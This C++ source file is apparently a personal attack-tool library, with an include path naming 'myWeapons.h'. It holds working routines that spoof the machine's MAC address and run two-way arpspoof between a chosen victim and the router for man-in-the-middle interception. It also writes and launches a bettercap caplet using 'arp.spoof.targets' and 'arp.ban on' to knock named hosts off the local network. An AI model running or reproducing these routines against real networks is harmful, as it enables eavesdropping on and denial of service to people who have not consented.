#include "/root/Desktop/Attacks/myTools/myWeapons.h"
#include <string>
#include <vector>
#include <stdlib.h>
#include <iostream>
#include <fstream>
#include <stdio.h>
#include <regex>
#include <tuple>
#include <sstream>
#include <thread>
#include <chrono>

// sleeps a proces for a given amount of seconds
void sleep(int seconds){
	int miliseconds =  seconds * 1000;
	std::this_thread::sleep_for(std::chrono::milliseconds(miliseconds));
}

// converts normal strings to c style strings
const char* cString(std::string value){
	//return &(value[0]];
	return value.c_str();
}
// grabs values from a string using a regex expression 
std::string grabEx(std::string expression, std::string constraint){
	std::string result = "";
	std::regex rule (constraint);
	std::smatch sm;
	std::regex_search (expression,sm,rule);
	
	// convert answer to string
	for (int index = 0; index < sm.size(); ++index){
		result += sm[index];
	}
	return result;
}
// generates a new mac Address
std::string createEther(){

	std::string ether = "00";
	const int limit = 10;
	int totalCharacters = 2;
	std::vector<std::string> characters = {"0","1","2","3","4","5","6",
		"7","8","9","A","B","C","D","E","F"};
	for (int x = 1; x <= limit; ++x){
		if (totalCharacters % 2 == 0){
			ether += ":";
		}
		int index = rand() % characters.size();
		std::string value = characters[index];
		ether += value;
		totalCharacters += 1;
		
	}
	return ether;
}
// retrieves a random seed value
int getSeed(){
	std::ifstream myFile;
	myFile.open("values.dat");
	std::string value = "";
	getline(myFile,value);
	myFile.close();
	return stoi(value);
}
// writes random seed value
void writeSeed(int value){
	std::ofstream myFile;
	myFile.open("values.dat");
	if (myFile.is_open()){
		myFile << value;
	} else {
		std::cout << "failed to open file";
	}
	myFile.close();
}
// creates new address and sets it as the current address
void changeMacAddress(){
	long long int value = getSeed();
	const long long int limit = 92233720368547758;
	value = (int)((value * 5) + 100) / 12;
	if (value < 1){
		value *= -1;
	} else if (value > limit){
		value = 1;
	}
	srand(value);
	std::string newEther = createEther();
	std::cout << "[+] " << newEther << "\n";
	std::string request = " ifconfig eth0 hw ether " + newEther;
	const char* command = request.c_str();

	system("ifconfig eth0 down");
	system(command);
	system("ifconfig eth0 up");
	writeSeed(value);
}
// dynamically converts one basic type to another 
template<class INPUT, class OUTPUT>
OUTPUT convert(INPUT value){
	OUTPUT result;
	std::stringstream stream;
	stream << value;
	stream >> result;
	stream.clear();
	return result;
}
// reads output from the shell in the terminal and returns a string
std::string getConsoleOutput(const char* command){

	/* 
	 * given a string command, should execute and return system response from terminal
	 * utilizeses popen from stdio.h to create a pipe connection
	 * */
	const int SIZE = 1024;
	char buffer[SIZE];
	const char* errorMessage = "execution failed";
	std::string result = "";
	// open pipe connection to terminal
	FILE* pipe = popen(command,"r");
	if (!pipe){
		// quick check if there is a connection to begin with
		return errorMessage;
	}
	try {
		// copy over values from the open pipe connection & store inside buffer
		while (fgets(buffer,SIZE,pipe) != NULL){
			result += buffer;
		}
	} catch (...){
		// something went wrong with the pipe connection
		pclose(pipe);
		return errorMessage;
	}
	pclose(pipe);
	return result;
}
// parses out the ip address from the console 
std::string parseIpAddress(std::string response){
	
/*
 * given a response from a terminal command 
 * should apply a regex query to retrieve ip address from response 
 * returns a string containing the ip address
 * */
	std::string ipAddress = "";
	// define regex rule
	std::regex rule ("\\d{1,3}.\\d{1,3}.\\d{1,3}.\\d{1,3}");
	std::smatch sm;
	std::regex_search (response,sm,rule);

	// convert result to string 
	for (int index = 0; index < sm.size(); ++index){
		ipAddress += sm[index];
	}
	return ipAddress;
}
std::tuple<std::string,std::string> getIpValues(){
	std::tuple<std::string,std::string> result;
	for (int x = 0; x < 2; ++x){
		// get values and parse
		std::string targetIp = "";
		std::cout << "[-] Enter IP [" << x << "]: ";
		if (x == 0){
			getline(std::cin,targetIp);
			std::get<0>(result) = parseIpAddress(targetIp);
		} else {
			getline(std::cin,targetIp);
			std::get<1>(result) = parseIpAddress(targetIp);

		}
		std::cout << parseIpAddress(targetIp) + " [" << x << "] \n";
	}
	std::cout << std::get<0>(result) + " | " + std::get<1>(result) << "\n";
	// (target,router)
	return result;
}

void runSpoof(){
	std::tuple<std::string,std::string> ipAddresses = getIpValues();
	std::string targetIp = std::get<0>(ipAddresses);
	std::string routerIp = std::get<1>(ipAddresses);
	std::string command1 = "arpspoof -i eth0 -t " + targetIp + " " + routerIp;
	std::string command2 = "arpspoof -i eth0 -t " + routerIp + " " + targetIp;
	std::string fullCommand = command1 + " && " + command2;
	//std::cout << fullCommand;
	//system(cString(fullCommand));
	system(cString(command1));
	system(cString(command2));
}
// reads code from a cap file and returns all lines in a string vector
std::vector<std::string> readFromCap(std::string fileName){
	std::vector<std::string> result;
	std::string line;
	std::stringstream converter;
	std::ifstream inFile;
	inFile.open(fileName);
	while (getline(inFile,line)){
		//converter >> line;
		result.push_back(line);
		line = "";
		//converter.clear();
	}
	return result;
}
// writes the code to a cap file and saves it
void writeToCap(std::string fileName, std::vector<std::string> content){
	std::ofstream outFile;
	outFile.open(fileName);
	if (outFile.is_open()){
		for (int index = 0; index < content.size(); ++index){
			std::string line = content[index];
			outFile << line << std::endl;
		}
	} else {
		std::cout << "Failed to open file.\n";
	}
	outFile.close();
}
// given one or more Ip addresses it should restrict internet access
void disconnect(std::string interface, std::vector<std::string> targets){
	const int LIMIT = targets.size() - 1;
	std::string allTargets;
	
	// create all targets
	for (int index = 0; index < targets.size(); ++index){
		if ((index < LIMIT) && (LIMIT >= 1)){
			allTargets += targets[index] + ", ";
		} else {
			allTargets += targets[index];
		}
	}
	// create targets
	std::string initialization = "bettercap -iface " + interface;
	std::string probeActivation = "net.probe on";
	std::string disconnectCommand = "set arp.spoof.targets " + allTargets;
	std::string banCommand = "arp.ban on";
	std::string filePath = "/root/caplets/dos.cap";
	std::string terminalCommand = initialization + " " + "-caplet " + filePath;
	std::vector<std::string> lines = {probeActivation,disconnectCommand,banCommand};
	writeToCap(filePath,lines);
	// run the program
	system(cString(terminalCommand));
}
